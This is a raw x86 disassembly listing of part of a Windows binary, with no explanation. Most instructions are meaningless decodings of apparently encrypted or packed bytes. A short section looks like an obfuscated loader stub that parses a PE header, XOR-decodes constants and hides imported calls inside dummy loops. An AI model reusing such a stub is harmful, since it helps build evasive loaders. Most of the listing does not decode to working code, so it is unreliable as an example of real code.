  417b89:	xchg   edi,eax
  417b8a:	and    eax,0x2a61e3f7
  417b8f:	jmp    0x7466:0xe4af8e0e
  417b96:	sar    BYTE PTR [eax],0x83
  417b99:	push   ds
  417b9a:	cmp    ecx,edx
  417b9c:	jl     0x417b6f
  417b9e:	scas   eax,DWORD PTR es:[edi]
  417b9f:	std    
  417ba0:	mov    eax,ds:0xe2caa771
  417ba5:	fild   WORD PTR [esp+ebp*8+0x6a]
  417ba9:	pushf  
  417baa:	xor    DWORD PTR [eax+0x5f3ee20a],0xffffffe4
  417bb1:	sub    al,0xdf
  417bb3:	push   ss
  417bb4:	inc    esi
  417bb5:	lea    eax,[edi+0xe]
  417bb8:	and    BYTE PTR [esi+0x5fa11f67],ch
  417bbe:	dec    DWORD PTR es:[edx]
  417bc1:	and    edi,DWORD PTR [edi+0x35]
  417bc4:	test   BYTE PTR [ecx],bh
  417bc6:	shl    BYTE PTR ds:0x5959f406,1
  417bcc:	add    al,0x86
  417bce:	sbb    ebx,ebp
  417bd0:	pop    edi
  417bd1:	rcr    DWORD PTR [ecx-0x2d],cl
  417bd4:	mov    BYTE PTR [ecx-0x1f6af606],ch
  417bda:	inc    ecx
  417bdb:	add    eax,0x10aaeec3
  417be0:	cmp    al,0xe3
  417be2:	fild   DWORD PTR [ebx]
  417be4:	sbb    ah,dl
  417be6:	mov    WORD PTR [eax],es
  417be8:	pop    ss
  417be9:	xor    DWORD PTR ds:0x872aa814,ebp
  417bef:	dec    esp
  417bf0:	cmc    
  417bf1:	mov    ecx,0x716fe6a4
  417bf6:	lds    esi,FWORD PTR [ecx-0x1cd678cf]
  417bfc:	repnz int3 
  417bfe:	jns    0x417b9f
  417c00:	ror    BYTE PTR [edx],1
  417c02:	out    0x21,al
  417c04:	xor    eax,0x94fe9653
  417c09:	adc    cl,cl
  417c0b:	add    al,0x55
  417c0d:	fmul   DWORD PTR [ebx]
  417c0f:	mov    bl,0xdb
  417c11:	(bad)
  417c15:	je     0x417c71
  417c17:	es out 0x3f,al
  417c1a:	mov    WORD PTR [ebp+eiz*4-0x76],fs
  417c1e:	xor    ebp,esp
  417c20:	cli    
  417c21:	(bad)  
  417c22:	push   edi
  417c23:	add    cl,dl
  417c25:	xor    BYTE PTR [edx+edi*4+0x18],cl
  417c29:	inc    ebx
  417c2a:	xor    ebp,DWORD PTR [ebx+0x3875ab06]
  417c30:	mov    bl,0x4f
  417c32:	js     0x417c77
  417c34:	ret    0xfd5a
  417c37:	jp     0x417c8b
  417c39:	sub    al,0x8a
  417c3b:	in     al,dx
  417c3c:	pop    ebp
  417c3d:	sub    al,BYTE PTR [ecx+ebp*2-0x27]
  417c41:	jo     0x417bdd
  417c43:	loopne 0x417cb7
  417c45:	mov    BYTE PTR [edi-0x7f],bh
  417c48:	xchg   ecx,eax
  417c49:	jnp    0x417c8c
  417c4b:	inc    ebp
  417c4c:	inc    esi
  417c4d:	jge    0x417bd8
  417c4f:	add    DWORD PTR [ebx],ecx
  417c51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c52:	jecxz  0x417be8
  417c54:	repz jae 0x417c46
  417c57:	fnstenv [ecx-0x6b]
  417c5a:	fimul  WORD PTR [edx]
  417c5c:	mov    DWORD PTR [esi-0x15],ebp
  417c5f:	cdq    
  417c60:	stos   DWORD PTR es:[edi],eax
  417c61:	adc    eax,DWORD PTR [ecx+0x4e]
  417c64:	dec    cl
  417c66:	and    esp,DWORD PTR [esi+0x42]
  417c69:	rcr    DWORD PTR [ebp-0x1d],0xd8
  417c6d:	(bad)  
  417c6e:	idiv   BYTE PTR [ecx+0x1b465793]
  417c74:	xor    al,0xb7
  417c76:	jecxz  0x417c77
  417c78:	dec    eax
  417c79:	arpl   WORD PTR [ecx-0x8d5d36a],si
  417c7f:	mov    fs,WORD PTR [edi+0x5839fbec]
  417c85:	push   ecx
  417c86:	fwait
  417c87:	lds    ebx,FWORD PTR [eax]
  417c89:	dec    ebx
  417c8a:	pop    ds
  417c8b:	jmp    0x9ab3:0x9b529cff
  417c92:	test   al,0xf9
  417c94:	jp     0x417cf3
  417c96:	lahf   
  417c97:	cmp    DWORD PTR [eax+0x69611fa],ebx
  417c9d:	xor    BYTE PTR [edx],ah
  417c9f:	add    DWORD PTR [ecx+0xd95525a],edx
  417ca5:	sub    ch,BYTE PTR [eax]
  417ca7:	mov    eax,ds:0xa87b1fd
  417cad:	inc    ebp
  417cae:	jae    0x417c5b
  417cb0:	pop    ecx
  417cb1:	or     DWORD PTR [edi],edi
  417cb3:	je     0x417cd9
  417cb5:	repnz dec esi
  417cb7:	(bad)  
  417cb8:	les    esp,FWORD PTR [edi-0x1554c80d]
  417cbe:	xor    esp,edi
  417cc0:	or     BYTE PTR [edx-0x2a],al
  417cc3:	jmp    0x417d15
  417cc5:	sbb    ch,ah
  417cc7:	sub    al,0x47
  417cc9:	dec    eax
  417ccb:	stos   DWORD PTR es:[edi],eax
  417ccc:	scas   eax,DWORD PTR es:[edi]
  417ccd:	enter  0xfae8,0x8d
  417cd1:	outs   dx,DWORD PTR ds:[esi]
  417cd2:	cmp    edx,ecx
  417cd4:	aad    0x6c
  417cd6:	aam    0x7
  417cd8:	mov    ebx,0x9d4db2a3
  417cdd:	xchg   ebp,eax
  417cde:	je     0x417ca1
  417ce0:	mov    ds:0xac0ba4e4,eax
  417ce5:	add    ecx,esp
  417ce7:	jne    0x417ce9
  417ce9:	and    eax,0x34419c92
  417cee:	mov    ah,0x89
  417cf0:	retf   
  417cf1:	pop    esp
  417cf2:	inc    edi
  417cf3:	push   esp
  417cf4:	cmp    al,0xde
  417cf6:	mov    bl,0xc8
  417cf8:	push   cs
  417cf9:	mov    eax,ds:0xd5a10d25
  417cfe:	mov    edi,0x9227725c
  417d03:	cmp    al,0x2
  417d05:	mov    edi,0x2607e74c
  417d0a:	xlat   BYTE PTR ds:[ebx]
  417d0b:	mov    cl,0xda
  417d0d:	gs icebp 
  417d0f:	push   edi
  417d10:	jmp    0x417d13
  417d12:	cmp    esi,DWORD PTR [ecx+0x13]
  417d15:	sub    cl,BYTE PTR [ecx+0x1c85d8b0]
  417d1b:	jns    0x417d49
  417d1d:	xor    ebx,DWORD PTR [edi+0x55e942bc]
  417d23:	and    dl,BYTE PTR [edx]
  417d25:	outs   dx,DWORD PTR ds:[esi]
  417d26:	mov    al,ch
  417d28:	sti    
  417d29:	lods   eax,DWORD PTR ds:[esi]
  417d2a:	xchg   edi,eax
  417d2b:	shl    esp,cl
  417d2d:	push   cs
  417d2e:	fucomp st(0)
  417d30:	push   ss
  417d31:	iret   
  417d32:	test   DWORD PTR [ebp+0x5b03759e],ebx
  417d38:	leave  
  417d39:	and    esi,DWORD PTR [esp+edi*4-0x1210afa5]
  417d40:	mov    WORD PTR [esi+0x2135e3a],fs
  417d46:	xor    al,0xa8
  417d48:	add    dl,dl
  417d4a:	shl    DWORD PTR [eax-0x4fe1d416],1
  417d50:	addr16 jg 0x417d42
  417d53:	sti    
  417d54:	ret    0x47d8
  417d57:	add    bl,ah
  417d59:	aam    0x64
  417d5b:	aad    0xc
  417d5d:	stc    
  417d5e:	inc    edx
  417d5f:	mov    esi,0xb5c52063
  417d64:	rcl    ah,cl
  417d66:	icebp  
  417d67:	cmp    ebx,DWORD PTR [eax]
  417d69:	test   eax,0x2051be79
  417d6e:	mov    WORD PTR [edi-0x749096bd],gs
  417d74:	ds sbb ebp,DWORD PTR ds:[edx-0x59855759]
  417d7c:	sbb    ebp,esp
  417d7e:	cmp    eax,0xd32fe22e
  417d83:	rol    DWORD PTR [ebp+0x6],0x99
  417d87:	inc    edx
  417d88:	adc    eax,0x142cc2ad
  417d8d:	push   ss
  417d8e:	or     eax,0xa0695356
  417d93:	mov    esp,DWORD PTR [edx]
  417d95:	call   0xadf51afe
  417d9a:	xor    BYTE PTR [esi],bh
  417d9c:	xor    esi,0xdfee4d4e
  417da2:	lods   al,BYTE PTR ds:[esi]
  417da3:	or     ebx,DWORD PTR [eax-0x24]
  417da6:	inc    ebp
  417da7:	pandn  mm1,mm7
  417daa:	xor    BYTE PTR [eax],ch
  417dac:	arpl   WORD PTR [esi+0x29],dx
  417daf:	sub    esp,esi
  417db1:	push   cs
  417db2:	movnti DWORD PTR [esi+0x3c530bd3],esi
  417db9:	mov    ah,0xa4
  417dbb:	dec    ebp
  417dbc:	data16 aaa 
  417dbe:	imul   eax,DWORD PTR [edi-0x55],0x6f
  417dc2:	(bad)  
  417dc3:	loopne 0x417d7b
  417dc5:	mov    ebp,0x798fbd37
  417dca:	push   es
  417dcb:	push   eax
  417dcc:	cmp    eax,0xc5b51f4f
  417dd1:	(bad)  
  417dd2:	mov    ds:0x105aad05,eax
  417dd7:	cmp    bl,BYTE PTR [edx]
  417dd9:	ins    BYTE PTR es:[edi],dx
  417dda:	mov    ebx,DWORD PTR [ecx*1+0x7dfa6f7a]
  417de1:	shl    bh,cl
  417de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417de4:	ja     0x417dde
  417de6:	and    bl,BYTE PTR [edi+0x7c]
  417de9:	xchg   BYTE PTR [ebx-0x10],al
  417dec:	adc    dh,BYTE PTR [eax]
  417dee:	outs   dx,DWORD PTR gs:[esi]
  417df0:	mov    ah,0x53
  417df2:	jg     0x417dc1
  417df4:	xchg   ebp,eax
  417df5:	mov    BYTE PTR [eax],al
  417df7:	aas    
  417df8:	push   esi
  417df9:	adc    edx,DWORD PTR [esi+0xb]
  417dfc:	repnz and al,0x34
  417dff:	xchg   edi,eax
  417e00:	sub    al,0x6
  417e02:	cmp    edi,eax
  417e04:	(bad)  
  417e05:	mov    esi,0x48c4ddf3
  417e0a:	dec    edi
  417e0b:	push   es
  417e0c:	push   esp
  417e0d:	je     0x417e1f
  417e0f:	test   DWORD PTR [edx+edx*1+0x62bf5b53],ebx
  417e16:	popf   
  417e17:	ror    DWORD PTR [eax+0x64a108f5],0xd9
  417e1e:	into   
  417e1f:	in     al,0x5f
  417e21:	inc    ebx
  417e22:	mov    DWORD PTR [eax-0xd],edx
  417e25:	jmp    0x6a57adfa
  417e2a:	xchg   ebp,eax
  417e2b:	std    
  417e2c:	inc    edi
  417e2d:	pusha  
  417e2e:	jbe    0x417db3
  417e30:	imul   BYTE PTR [ebp+0x3683f317]
  417e36:	dec    bp
  417e38:	cwde   
  417e39:	xchg   ebp,eax
  417e3a:	and    bl,ch
  417e3c:	cdq    
  417e3d:	pop    es
  417e3e:	fcom   DWORD PTR [ebx]
  417e40:	loop   0x417e69
  417e42:	mov    ds:0x52f99d88,eax
  417e47:	loop   0x417e9f
  417e49:	in     al,0xe0
  417e4b:	sub    ch,BYTE PTR ds:0xef02f36f
  417e51:	std    
  417e52:	add    BYTE PTR [ecx-0x7bfbe4a5],dh
  417e58:	repz sub al,0x34
  417e5b:	dec    esi
  417e5c:	jg     0x417e86
  417e5e:	sub    dl,ch
  417e60:	pop    esi
  417e61:	imul   esi,DWORD PTR [eax-0x7f0ae1fe],0x172c9f24
  417e6b:	jo     0x417e31
  417e6d:	and    edi,edx
  417e6f:	or     eax,0xd31cd0e5
  417e74:	adc    eax,DWORD PTR [edi]
  417e76:	and    al,BYTE PTR [eax-0x58]
  417e79:	adc    edx,DWORD PTR [esi+0x55]
  417e7c:	inc    edi
  417e7d:	outs   dx,DWORD PTR ds:[esi]
  417e7e:	(bad)  
  417e7f:	mov    ebx,0x384d8bc0
  417e84:	cmp    DWORD PTR [ebx-0x64],ebp
  417e87:	pop    esp
  417e88:	and    al,0x98
  417e8a:	(bad)  
  417e8b:	loopne 0x417e35
  417e8d:	mov    ebp,0x4211a675
  417e92:	push   esi
  417e93:	adc    BYTE PTR [eax-0x2b],0xfd
  417e97:	sahf   
  417e98:	add    BYTE PTR [ecx+0xcc67bcf],0x8b
  417e9f:	adc    eax,0x40951127
  417ea4:	push   ss
  417ea5:	sub    esp,edi
  417ea7:	mov    esp,0x9e8fd737
  417eac:	mov    eax,0xa8a51757
  417eb1:	loope  0x417efe
  417eb3:	out    dx,al
  417eb4:	bound  esi,QWORD PTR [eax+esi*8]
  417eb7:	dec    esi
  417eb8:	dec    esp
  417eb9:	push   edx
  417eba:	dec    esi
  417ebb:	sbb    bh,bh
  417ebd:	xchg   ecx,eax
  417ebe:	inc    esi
  417ebf:	(bad)  
  417ec0:	pop    di
  417ec2:	dec    edi
  417ec3:	mov    ebx,0xe10180ee
  417ec8:	dec    esi
  417ec9:	and    BYTE PTR [eax+edx*8-0xd],0x87
  417ece:	sub    eax,0xec7d6ff6
  417ed3:	jns    0x417ef1
  417ed5:	xchg   esi,eax
  417ed6:	xor    eax,0xfc202d6c
  417edb:	push   esi
  417edc:	dec    edx
  417edd:	adc    edx,eax
  417edf:	addr16 mov cl,dh
  417ee2:	sub    ecx,esp
  417ee4:	aaa    
  417ee5:	and    DWORD PTR [ecx-0xf],edi
  417ee8:	and    DWORD PTR [ebx-0xd],esi
  417eeb:	jl     0x417f2b
  417eed:	fwait
  417eee:	or     eax,0x734d2703
  417ef3:	xor    BYTE PTR [esi+0x6229c88],ch
  417ef9:	sar    DWORD PTR [ebx-0x40],0x5f
  417efd:	jmp    0xce0:0x6aea8ac6
  417f04:	sbb    DWORD PTR [eax+ebp*8+0x1767e7bb],edi
  417f0b:	mov    al,BYTE PTR [ecx]
  417f0d:	push   0x36
  417f0f:	push   0x6e
  417f11:	lahf   
  417f12:	push   0xffffffe0
  417f14:	shl    cl,cl
  417f16:	mov    ah,0x1d
  417f18:	test   BYTE PTR [ecx],cl
  417f1a:	scas   al,BYTE PTR es:[edi]
  417f1b:	pop    esi
  417f1c:	push   0xdcf80340
  417f21:	pop    esp
  417f22:	pop    esi
  417f23:	sbb    ecx,DWORD PTR [edx+0x4058100]
  417f29:	nop
  417f2a:	inc    edx
  417f2b:	add    BYTE PTR [esi+0x24],cl
  417f2e:	add    BYTE PTR [eax],al
  417f30:	add    al,0xd
  417f32:	xor    DWORD PTR ds:0x429014,0x42600c
  417f3c:	xor    al,0x6f
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x42000b
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d26c
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	retf   0x9344
  418116:	stos   DWORD PTR es:[edi],eax
  418117:	std    
  418118:	and    al,0x61
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx-0x34]
  418120:	inc    edi
  418121:	jmp    0x1328381e
  418126:	push   eax
  418127:	js     0x41816a
  418129:	inc    edi
  41812a:	mov    fs,esi
  41812c:	loop   0x41811f
  41812e:	iret   
  41812f:	mov    bl,0x43
  418131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418132:	out    dx,eax
  418133:	push   esp
  418134:	fiadd  DWORD PTR [ebx+0x6173c62a]
  41813a:	jmp    0x5e25b576
  41813f:	fisub  DWORD PTR [esi+0x11]
  418142:	arpl   WORD PTR [ebp+0x20],di
  418145:	mov    ds:0x6a74ea4,eax
  41814a:	pop    ebp
  41814b:	popf   
  41814c:	jno    0x4180e8
  41814e:	adc    dl,BYTE PTR [edi]
  418150:	call   0x62c1:0xae365336
  418157:	arpl   WORD PTR ds:0x5d232461,bp
  41815d:	sbb    eax,0xf2e011de
  418162:	sbb    BYTE PTR [ecx+0x2c55f6b0],bh
  418168:	scas   eax,DWORD PTR es:[edi]
  418169:	imul   edx,DWORD PTR [ecx],0x22
  41816c:	fadd   QWORD PTR [ebx+edx*4+0x1]
  418170:	daa    
  418171:	in     eax,dx
  418172:	adc    eax,esp
  418174:	outs   dx,BYTE PTR ds:[esi]
  418175:	fistp  WORD PTR [eax+0x55555c54]
  41817b:	ficomp DWORD PTR [esp+ecx*2]
  41817e:	test   DWORD PTR [ebp-0x4f483697],0xb77926e8
  418188:	xchg   esp,eax
  418189:	or     cl,BYTE PTR [esi]
  41818b:	mov    esi,0x1b8ab07f
  418190:	loopne 0x4181ff
  418192:	fdivr  DWORD PTR [ebx-0x7979e9b6]
  418198:	inc    edi
  418199:	(bad)  
  41819a:	xor    ch,BYTE PTR [edi]
  41819c:	imul   BYTE PTR [edx+0x50]
  41819f:	sub    al,0x74
  4181a1:	icebp  
  4181a2:	mov    edi,0xeb5ed585
  4181a7:	cmp    bh,ch
  4181a9:	pop    ss
  4181aa:	fs aad 0x2a
  4181ad:	(bad)  
  4181ae:	test   eax,0x6cac1e00
  4181b3:	lahf   
  4181b4:	cwde   
  4181b5:	xor    BYTE PTR [ebx-0x6f2fd99],ch
  4181bb:	or     al,0xce
  4181bd:	in     al,dx
  4181be:	mul    BYTE PTR [ebp-0x27]
  4181c1:	or     BYTE PTR ds:0x293a173f,al
  4181c7:	and    al,0xf6
  4181c9:	(bad)  [ebx-0x18]
  4181cc:	mov    al,ds:0xd938607d
  4181d1:	mov    ebx,0x3c28b167
  4181d6:	cmp    ebp,edi
  4181d8:	jae    0x4181cc
  4181da:	mov    ebx,0x5974ed5b
  4181df:	call   0xa9fa9d82
  4181e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181e5:	sub    dh,BYTE PTR [ecx]
  4181e7:	mov    esi,0x1ab87548
  4181ec:	mov    fs:0x42bdfb51,eax
  4181f2:	les    edi,FWORD PTR [eax-0x59]
  4181f5:	cmp    BYTE PTR [ebx+0x6b],bl
  4181f8:	out    dx,eax
  4181f9:	and    eax,0xf0d97d8f
  4181fe:	mov    ebp,0x1d43f130
  418203:	aam    0x79
  418205:	sub    DWORD PTR [esp+0x10],edx
  418209:	stos   DWORD PTR es:[edi],eax
  41820a:	dec    esi
  41820b:	mov    al,ds:0x343583b7
  418210:	scas   eax,DWORD PTR es:[edi]
  418211:	and    DWORD PTR [eax],ebp
  418213:	mov    ecx,0xda7c01c1
  418218:	mov    bh,0xed
  41821a:	xchg   esi,eax
  41821b:	cli    
  41821c:	dec    esi
  41821d:	and    BYTE PTR [edx],al
  41821f:	push   ebp
  418220:	sub    al,0xb6
  418222:	stos   DWORD PTR es:[edi],eax
  418223:	out    0xfb,al
  418225:	pop    ebx
  418226:	repnz pop ebp
  418228:	rol    BYTE PTR [esi+0x37],cl
  41822b:	int    0xc0
  41822d:	xor    al,0xa7
  41822f:	xchg   ecx,eax
  418230:	jge    0x41826d
  418232:	in     al,0x50
  418234:	jae    0x4181f1
  418236:	mov    dl,BYTE PTR [eax]
  418238:	fcomi  st,st(5)
  41823a:	arpl   WORD PTR [esi],sp
  41823c:	xor    bl,BYTE PTR [ecx+0xa]
  41823f:	push   ds
  418240:	add    eax,0x11df0e78
  418245:	jo     0x418202
  418247:	leave  
  418248:	xchg   al,bl
  41824a:	ja     0x4181f5
  41824c:	or     bl,0x8f
  41824f:	push   edx
  418250:	stc    
  418251:	sub    ebx,ebp
  418253:	aam    0xac
  418255:	lock mov bl,0x8d
  418258:	js     0x418293
  41825a:	hlt    
  41825b:	in     al,0x13
  41825d:	mov    bh,0xd6
  41825f:	popa   
  418260:	cmp    al,0xe1
  418262:	inc    eax
  418263:	cmp    BYTE PTR [eax],ch
  418265:	adc    dh,dh
  418267:	in     eax,0xa4
  418269:	or     ecx,DWORD PTR [ecx-0x61a0e57c]
  41826f:	xchg   edx,eax
  418270:	add    dl,dl
  418272:	cmp    eax,0x23ae75ef
  418277:	cli    
  418278:	dec    ebp
  418279:	xchg   ecx,eax
  41827a:	mov    esp,DWORD PTR ds:0xb8c09025
  418280:	daa    
  418281:	rcl    BYTE PTR [ebx+ebx*8-0x62],1
  418285:	adc    BYTE PTR [ecx],ch
  418287:	sbb    eax,0x42f7d80a
  41828c:	aam    0xd
  41828e:	aas    
  41828f:	inc    ebx
  418290:	out    dx,al
  418291:	icebp  
  418292:	sub    BYTE PTR [ecx],cl
  418294:	add    eax,edx
  418296:	jbe    0x41822b
  418298:	cs ret 0x2dd1
  41829c:	sub    eax,0x67028774
  4182a1:	daa    
  4182a2:	mov    DWORD PTR [ebx],esp
  4182a4:	pop    esp
  4182a5:	call   0xcd7e:0xc9d518fb
  4182ac:	cmp    BYTE PTR [ecx+0xb81ffd6],bh
  4182b2:	int3   
  4182b3:	or     al,0x77
  4182b5:	je     0x418264
  4182b7:	mov    ebp,0x854ca680
  4182bc:	and    ch,ah
  4182be:	and    edx,DWORD PTR [ecx+0x59d2f12e]
  4182c4:	inc    edi
  4182c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182c6:	sub    bl,al
  4182c8:	outs   dx,BYTE PTR ds:[esi]
  4182c9:	xchg   ebp,eax
  4182ca:	mov    gs,WORD PTR [di]
  4182cd:	gs out 0x92,al
  4182d0:	sbb    ah,0xb4
  4182d3:	dec    ebp
  4182d4:	mov    ebp,0x8010bdb4
  4182d9:	outs   dx,BYTE PTR ds:[esi]
  4182da:	gs sub bl,al
  4182dd:	outs   dx,DWORD PTR ds:[esi]
  4182de:	fistp  QWORD PTR [ebp+eiz*4-0x2334ece7]
  4182e5:	aad    0x2f
  4182e7:	jmp    0x6d11:0x5fd1b91a
  4182ee:	mov    al,0x58
  4182f0:	mov    ch,0xfc
  4182f2:	cld    
  4182f3:	lods   al,BYTE PTR ds:[esi]
  4182f4:	loop   0x41829c
  4182f6:	lahf   
  4182f7:	push   eax
  4182f8:	dec    ecx
  4182f9:	mov    edx,0x6d13911a
  4182fe:	inc    esp
  4182ff:	adc    al,0x18
  418301:	dec    esi
  418302:	inc    ebp
  418303:	into   
  418304:	dec    edx
  418305:	ret    0xd4af
  418308:	(bad)  
  418309:	sti    
  41830a:	aas    
  41830b:	scas   eax,DWORD PTR es:[edi]
  41830c:	pop    ss
  41830d:	fdiv   st,st(0)
  41830f:	adc    al,0x3f
  418311:	mov    edi,0xdd88f702
  418316:	loopne 0x418335
  418318:	cli    
  418319:	clc    
  41831a:	call   DWORD PTR [ebp+0x64]
  41831d:	(bad)  
  41831e:	cmp    BYTE PTR [ebx+0x63],al
  418321:	pop    ebp
  418322:	mov    al,0x7d
  418324:	lds    edi,FWORD PTR [eax+edx*1]
  418327:	cmp    BYTE PTR [ebx-0x221b9b68],dl
  41832d:	int3   
  41832e:	cmp    ch,cl
  418330:	jae    0x41835d
  418332:	mov    esi,0xfe293406
  418337:	(bad)  
  418338:	and    BYTE PTR [esp-0x2b5defb5],al
  41833f:	jl     0x4183b5
  418341:	sbb    al,0xf0
  418343:	xchg   ebx,eax
  418344:	xor    al,0x5b
  418346:	adc    cl,ch
  418348:	mov    dl,0xc9
  41834a:	sub    esp,edx
  41834c:	ror    DWORD PTR [eax-0x6f],0x14
  418350:	sub    edx,esp
  418352:	sub    esi,esi
  418354:	in     eax,dx
  418355:	loope  0x418322
  418357:	outs   dx,BYTE PTR ds:[esi]
  418358:	jne    0x418393
  41835a:	rcl    BYTE PTR [ecx+0x3c],cl
  41835d:	xor    bl,BYTE PTR [eax-0x55b75676]
  418363:	xchg   ebp,eax
  418364:	adc    DWORD PTR [ebx+ecx*2],edi
  418367:	pop    edi
  418368:	inc    edx
  418369:	cmp    DWORD PTR [esi],eax
  41836b:	call   0xf6d2ef39
  418370:	mov    eax,ds:0x6fc9dcdf
  418375:	stos   BYTE PTR es:[edi],al
  418376:	dec    ecx
  418377:	in     al,0x1e
  418379:	icebp  
  41837a:	cmp    ch,BYTE PTR [ebp-0x66dc1c6b]
  418380:	cli    
  418381:	and    ecx,DWORD PTR [ecx]
  418383:	std    
  418384:	dec    eax
  418385:	mov    bh,BYTE PTR [ebp-0x5a9e5bcc]
  41838b:	imul   edi,DWORD PTR [edi-0x73],0x70269cb3
  418392:	fstp   DWORD PTR [edx]
  418394:	pop    ebx
  418395:	mov    dh,dh
  418397:	cmp    al,0x98
  418399:	xchg   DWORD PTR [esi+edi*1],esp
  41839c:	lahf   
  41839d:	(bad)  
  41839e:	les    ecx,FWORD PTR [edx-0x6a]
  4183a1:	fsub   QWORD PTR [edx+ecx*8-0x34]
  4183a5:	or     esp,DWORD PTR [ecx+0x701f27b0]
  4183ab:	cmc    
  4183ac:	fsincos 
  4183ae:	(bad)  
  4183af:	lods   eax,DWORD PTR ds:[esi]
  4183b0:	inc    esi
  4183b1:	repz fstp QWORD PTR [ecx+ecx*4+0x211cfd87]
  4183b9:	sub    DWORD PTR [ecx],esp
  4183bb:	jmp    0x4183a6
  4183bd:	mov    ch,0xd3
  4183bf:	push   es
  4183c0:	sti    
  4183c1:	push   edx
  4183c2:	sub    al,0x41
  4183c4:	inc    ebp
  4183c5:	jnp    0x4183fb
  4183c7:	push   edi
  4183c8:	mov    ch,0xf9
  4183ca:	(bad)  [ecx]
  4183cd:	jmp    0x418420
  4183cf:	dec    eax
  4183d0:	add    eax,0xb2d1b7b2
  4183d5:	(bad)  
  4183d6:	aam    0x0
  4183d8:	inc    esi
  4183d9:	mul    DWORD PTR [edi-0x161ef0a8]
  4183df:	xchg   BYTE PTR [edx+0x596fd4b7],al
  4183e5:	inc    eax
  4183e6:	dec    ebx
  4183e7:	sbb    dl,BYTE PTR [edx]
  4183e9:	stos   BYTE PTR es:[edi],al
  4183ea:	sahf   
  4183eb:	shl    ebp,1
  4183ed:	arpl   WORD PTR [esi-0x1],di
  4183f0:	adc    eax,0xf5660777
  4183f5:	mov    bl,0xe
  4183f7:	popf   
  4183f8:	aad    0x56
  4183fa:	and    BYTE PTR [ecx-0x4b],cl
